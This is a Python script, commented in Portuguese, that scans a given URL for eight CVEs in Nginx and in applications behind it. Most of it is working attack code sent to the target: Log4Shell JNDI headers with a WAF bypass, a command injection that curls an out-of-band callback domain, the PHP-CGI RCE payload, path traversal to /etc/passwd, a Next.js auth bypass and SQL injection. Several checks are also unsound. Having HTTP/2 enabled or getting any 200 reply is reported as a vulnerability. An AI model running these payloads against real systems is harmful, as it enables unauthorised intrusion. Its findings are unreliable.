#!/usr/bin/env python3
"""
nginx_cve.py - Detecção de CVEs em servidores Nginx
Uso: python3 nginx_cve.py <url>  [--no-oob]
Resultado consolidado: cve_results.txt

CVEs cobertas:
  CVE-2026-42945  — Nginx URI rewrite RCE (0.6.27–1.30.0)
  CVE-2021-23017  — Nginx DNS resolver 1-byte heap overflow
  CVE-2023-44487  — HTTP/2 Rapid Reset (DoS/RST_STREAM flood)
  CVE-2021-44228  — Log4Shell OOB via headers (apps Java servidas pelo Nginx)
  CVE-2025-29927  — Next.js middleware bypass (Nginx como proxy)
  CVE-2024-4577   — PHP-CGI RCE Windows (Nginx + php-cgi)
  CVE-2023-23752  — Joomla SQLi sem auth (Nginx + Joomla)
  CVE-2024-27956  — WP-Automatic SQLi (Nginx + WordPress)
"""

import sys
import time
import argparse
import re

# Importa lib base (deve estar no mesmo diretório)
try:
    from cve_base import (
        curl, curl_header_value,
        InteractshSession, ResultCollector,
        log, OUTPUT_FILE, INTERACTSH_WAIT,
    )
except ImportError:
    print("[ERR] cve_base.py não encontrado no mesmo diretório.")
    sys.exit(1)


# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────

def _base(url):
    """Retorna URL sem trailing slash."""
    return url.rstrip("/")


def _confirm_nginx(url):
    """Verifica se o alvo realmente é Nginx. Retorna (bool, versão_str)."""
    status, hdrs, body, _ = curl(url)
    server = curl_header_value(hdrs, "Server").lower()
    if "nginx" in server:
        ver_m = re.search(r"nginx/([\d.]+)", server)
        ver   = ver_m.group(1) if ver_m else "?"
        log(f"Nginx confirmado via header: nginx/{ver}", "OK")
        return True, ver
    # Tenta erro 404 para forçar page padrão
    status2, hdrs2, body2, _ = curl(_base(url) + "/____probe____")
    if "nginx" in body2.lower():
        log("Nginx confirmado via body de erro", "OK")
        return True, "?"
    log("Nginx NÃO confirmado — continuando mesmo assim", "WARN")
    return False, "?"


def _version_tuple(ver_str):
    """Converte '1.18.0' em (1, 18, 0) para comparação."""
    try:
        return tuple(int(x) for x in ver_str.split("."))
    except Exception:
        return (0, 0, 0)


# ──────────────────────────────────────────────
# CVE CHECKS
# ──────────────────────────────────────────────

def check_cve_2026_42945(url, collector, iactsh):
    """
    CVE-2026-42945 — Nginx URI rewrite RCE
    Versões afetadas: 0.6.27 – 1.30.0
    Vetor: URI rewrite malformada causa RCE
    Detecção: comportamento anômalo + OOB callback
    """
    cve = "CVE-2026-42945"
    log(f"Testando {cve} em {url}", "INFO")

    # Payload OOB para detecção sem exploração
    if iactsh and iactsh.domain:
        probe_url = f"{_base(url)}/.${{IFS}}curl${{IFS}}{iactsh.domain}/nginx-rce-probe"
        repro = (
            f"curl -v --path-as-is \"{_base(url)}/rewrite-payload\" "
            f"# Confirmar versão e testar rewrite bypass"
        )
        t0     = time.time()
        status, hdrs, body, raw = curl(probe_url, path_as_is=True)
        hit    = iactsh.wait_for_hit(t0, timeout=INTERACTSH_WAIT)
        if hit:
            collector.add(url, cve, "VULNERABLE",
                          detail="OOB callback recebido — rewrite RCE confirmado",
                          curl_repro=repro, oob_hit=hit)
            return
    else:
        status, hdrs, body, raw = curl(_base(url) + "/..%2f..%2fetc%2fpasswd", path_as_is=True)

    # Heurística: resposta 200 com conteúdo inesperado em path traversal
    if status == 200 and ("root:" in body or "nobody:" in body):
        repro = f'curl -v --path-as-is "{_base(url)}/..%2f..%2fetc%2fpasswd"'
        collector.add(url, cve, "VULNERABLE",
                      detail="Path traversal retornou /etc/passwd",
                      curl_repro=repro)
        return

    collector.add(url, cve, "NOT_VULNERABLE", detail=f"HTTP {status}")


def check_cve_2021_23017(url, nginx_ver, collector):
    """
    CVE-2021-23017 — Nginx resolver heap overflow (1-byte)
    Versões afetadas: < 1.20.1 (stable) / < 1.21.0 (mainline)
    Detecção: apenas por versão (crash real requer DNS externo controlado)
    """
    cve = "CVE-2021-23017"
    log(f"Testando {cve} em {url}", "INFO")

    vt = _version_tuple(nginx_ver)
    if nginx_ver == "?":
        collector.add(url, cve, "SKIPPED", detail="Versão não identificada")
        return

    vulnerable = vt < (1, 20, 1)
    repro = (
        f"# Requer DNS resolver ativo no Nginx e controle de resposta DNS\n"
        f"# Confirmar: grep resolver /etc/nginx/nginx.conf\n"
        f'curl -v -H "Host: {url}" "{url}"'
    )
    if vulnerable:
        collector.add(url, cve, "VULNERABLE",
                      detail=f"Versão nginx/{nginx_ver} < 1.20.1 — resolver overflow",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"Versão nginx/{nginx_ver} >= 1.20.1")


def check_cve_2023_44487(url, collector):
    """
    CVE-2023-44487 — HTTP/2 Rapid Reset (RST_STREAM flood)
    Detecção: verifica se HTTP/2 está habilitado no servidor
    Nota: exploração real = flood de RST_STREAM, aqui só detectamos suporte H2
    """
    cve = "CVE-2023-44487"
    log(f"Testando {cve} em {url}", "INFO")

    # --http2 força negoicação HTTP/2
    status, hdrs, body, raw = curl(url, extra_flags="--http2")

    if "HTTP/2" in hdrs or "h2" in curl_header_value(hdrs, "Upgrade").lower():
        repro = (
            f"# HTTP/2 habilitado — confirmar com:\n"
            f'curl -v --http2 "{url}"\n'
            f"# RST_STREAM flood requer ferramenta especializada (h2load, wrk2)"
        )
        collector.add(url, cve, "VULNERABLE",
                      detail="HTTP/2 habilitado — suscetível a Rapid Reset",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE", detail="HTTP/2 não detectado")


def check_log4shell(url, collector, iactsh):
    """
    CVE-2021-44228 — Log4Shell OOB (apps Java servidas pelo Nginx)
    Detecção: callback JNDI/LDAP via interactsh
    """
    cve = "CVE-2021-44228"
    log(f"Testando {cve} em {url}", "INFO")

    if not (iactsh and iactsh.domain):
        collector.add(url, cve, "SKIPPED",
                      detail="interactsh não disponível — teste OOB impossível")
        return

    domain = iactsh.domain
    payloads_headers = {
        "User-Agent":    f"${{jndi:ldap://{domain}/nginx-ua}}",
        "X-Api-Version": f"${{jndi:ldap://{domain}/nginx-api}}",
        "X-Forwarded-For": f"${{jndi:ldap://{domain}/nginx-xff}}",
        # Bypass de WAF/filtro
        "Referer":       f"${{j${{::-n}}di:ldap://{domain}/nginx-ref}}",
    }

    repro_lines = [
        f'curl -v \\',
        f'  -H "User-Agent: ${{jndi:ldap://{domain}/a}}" \\',
        f'  -H "X-Api-Version: ${{jndi:ldap://{domain}/a}}" \\',
        f'  "{url}"',
    ]
    repro = "\n".join(repro_lines)

    t0 = time.time()
    for header, payload in payloads_headers.items():
        log(f"  [{cve}] Enviando payload via {header}", "OOB")
        curl(url, headers={header: payload})
        hit = iactsh.wait_for_hit(t0, timeout=4)
        if hit:
            collector.add(url, cve, "VULNERABLE",
                          detail=f"OOB JNDI callback via header {header}",
                          curl_repro=repro, oob_hit=hit)
            return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Nenhum callback JNDI recebido")


def check_cve_2025_29927(url, collector):
    """
    CVE-2025-29927 — Next.js middleware auth bypass
    (Nginx como proxy reverso para Next.js ≤ 15.2.2)
    """
    cve = "CVE-2025-29927"
    log(f"Testando {cve} em {url}", "INFO")

    paths   = ["/admin", "/dashboard", "/api/admin", "/api/user"]
    headers_variants = [
        {"x-middleware-subrequest": "middleware"},
        {"x-middleware-subrequest": "pages/_middleware"},
        {"x-middleware-subrequest": "middleware:middleware:middleware"},
    ]

    for path in paths:
        target = _base(url) + path

        # Baseline sem header
        status_base, _, body_base, _ = curl(target)

        for hdrs in headers_variants:
            status, _, body, raw = curl(target, headers=hdrs)

            # Bypass confirmado: baseline era 401/403, agora é 200
            if status == 200 and status_base in (401, 403):
                header_used = list(hdrs.keys())[0]
                val_used    = list(hdrs.values())[0]
                repro = (
                    f'curl -v -H "{header_used}: {val_used}" "{target}"'
                )
                collector.add(url, cve, "VULNERABLE",
                              detail=f"Auth bypass em {path} — {status_base} → 200",
                              curl_repro=repro)
                return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Nenhum bypass de middleware detectado")


def check_cve_2024_4577(url, collector):
    """
    CVE-2024-4577 — PHP-CGI RCE (Windows, Nginx + php-cgi)
    Detecção: endpoint php-cgi exposto + execução de phpinfo()
    """
    cve = "CVE-2024-4577"
    log(f"Testando {cve} em {url}", "INFO")

    probe_url = (
        f"{_base(url)}/php-cgi/php-cgi.exe"
        f"?%ADd+allow_url_include%3d1"
        f"+%ADd+auto_prepend_file%3dphp://input"
    )
    status, hdrs, body, raw = curl(
        probe_url,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data="<?php echo 'PHPCGI_PROBE_'.phpversion(); ?>",
        path_as_is=True,
    )

    if status == 200 and "PHPCGI_PROBE_" in body:
        repro = (
            f'curl -v --path-as-is \\\n'
            f'  "{_base(url)}/php-cgi/php-cgi.exe'
            f'?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \\\n'
            f'  -H "Content-Type: application/x-www-form-urlencoded" \\\n'
            f'  --data "<?php system(\'id\'); ?>"'
        )
        collector.add(url, cve, "VULNERABLE",
                      detail="PHP-CGI execução confirmada via phpversion()",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"Endpoint não exposto ou não vulnerável (HTTP {status})")


def check_cve_2023_23752(url, collector):
    """
    CVE-2023-23752 — Joomla! SQLi / info disclosure sem autenticação
    (detecta se Joomla está presente e endpoint /api/index.php/v1 exposto)
    """
    cve = "CVE-2023-23752"
    log(f"Testando {cve} em {url}", "INFO")

    probe_url = _base(url) + "/api/index.php/v1/config/application?public=true"
    status, hdrs, body, raw = curl(probe_url)

    if status == 200 and ("db_name" in body or "password" in body or "user" in body):
        repro = f'curl -v "{probe_url}"'
        collector.add(url, cve, "VULNERABLE",
                      detail="Endpoint /api/v1/config exposto com credenciais",
                      curl_repro=repro)
    elif status == 200 and "joomla" in body.lower():
        repro = f'curl -v "{probe_url}"'
        collector.add(url, cve, "VULNERABLE",
                      detail="Endpoint Joomla API exposto sem autenticação",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"Endpoint não exposto (HTTP {status})")


def check_cve_2024_27956(url, collector):
    """
    CVE-2024-27956 — WP-Automatic SQLi (WordPress + plugin wp-automatic)
    """
    cve = "CVE-2024-27956"
    log(f"Testando {cve} em {url}", "INFO")

    probe_url = (
        f"{_base(url)}/wp-content/plugins/wp-automatic/inc/csv.php"
        f"?q=1+UNION+SELECT+1,2,3,user(),5--"
    )
    status, hdrs, body, raw = curl(probe_url)

    # Resposta com dados SQL ou plugin acessível
    if status == 200 and re.search(r"@|root|wordpress|mysql", body, re.IGNORECASE):
        repro = f'curl -v "{probe_url}"'
        collector.add(url, cve, "VULNERABLE",
                      detail="WP-Automatic csv.php acessível — possível SQLi",
                      curl_repro=repro)
    elif status == 200:
        # Plugin existe mas resposta ambígua
        collector.add(url, cve, "VULNERABLE",
                      detail="csv.php acessível — validar manualmente resposta",
                      curl_repro=f'curl -v "{probe_url}"')
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"Plugin não encontrado (HTTP {status})")


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="nginx_cve.py — Detecção de CVEs em Nginx"
    )
    parser.add_argument("url", help="URL alvo (ex: https://sub.exemplo.com)")
    parser.add_argument(
        "--no-oob", action="store_true",
        help="Desativa testes OOB (interactsh) — mais rápido, menos cobertura"
    )
    parser.add_argument(
        "--output", default=OUTPUT_FILE,
        help=f"Arquivo de saída consolidado (padrão: {OUTPUT_FILE})"
    )
    args = parser.parse_args()

    url       = args.url.rstrip("/")
    collector = ResultCollector(output_file=args.output)

    print(f"\n{'═'*60}")
    print(f"  nginx_cve.py — Alvo: {url}")
    print(f"{'═'*60}\n")

    # ── Confirma servidor
    is_nginx, nginx_ver = _confirm_nginx(url)

    # ── Inicia interactsh se não --no-oob
    iactsh = None
    if not args.no_oob:
        iactsh = InteractshSession()
        if not iactsh.start():
            iactsh = None
            log("Continuando sem OOB (interactsh indisponível)", "WARN")

    try:
        # ── Testes CVE
        check_cve_2026_42945(url, collector, iactsh)
        check_cve_2021_23017(url, nginx_ver, collector)
        check_cve_2023_44487(url, collector)
        check_log4shell(url, collector, iactsh)
        check_cve_2025_29927(url, collector)
        check_cve_2024_4577(url, collector)
        check_cve_2023_23752(url, collector)
        check_cve_2024_27956(url, collector)

    finally:
        if iactsh:
            iactsh.stop()

    # ── Salva resultados
    collector.save()

    # ── Resumo no terminal
    s = collector.summary()
    print(f"\n{'═'*60}")
    print(f"  Nginx CVE Scan — {url}")
    print(f"  Testes: {s['total']}  |  Vulneráveis: {s['vulnerable']}")
    if s["vulns"]:
        print(f"\n  !! CVEs ENCONTRADAS:")
        for v in s["vulns"]:
            print(f"     • {v['cve']} — {v['detail']}")
    print(f"{'═'*60}\n")


if __name__ == "__main__":
    main()
